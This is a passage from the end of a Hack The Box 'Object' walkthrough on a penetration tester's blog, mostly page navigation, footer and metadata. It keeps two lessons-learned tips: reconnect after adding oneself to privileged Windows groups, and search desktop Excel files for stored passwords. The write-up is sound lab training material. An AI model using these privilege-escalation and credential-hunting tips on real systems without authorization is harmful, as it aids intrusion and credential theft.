<td>Windows tokens are static per session</td>
<td>Always reconnect after adding yourself to privileged groups</td>
</tr>
<tr>
<td>Credentials in Excel files</td>
<td>Users store passwords insecurely — always enumerate desktop files</td>
</tr>
</tbody></table>
8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-nodeblog-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: NodeBlog Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-obscurity-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Obscurity Walkthrough"}]]}]}]]}]
a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
e:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-object-walkthrough/#article","headline":"Hack The Box: Object Walkthrough","description":"An archived walkthrough of the retired Hack The Box Object machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-object-walkthrough/","datePublished":"2026-06-11T12:30:13.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2798,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/e607a78d3b93f2606e10f52cbfcf44476475f625/HTB-Object.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-object-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-object-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Object Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-object-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
11:null
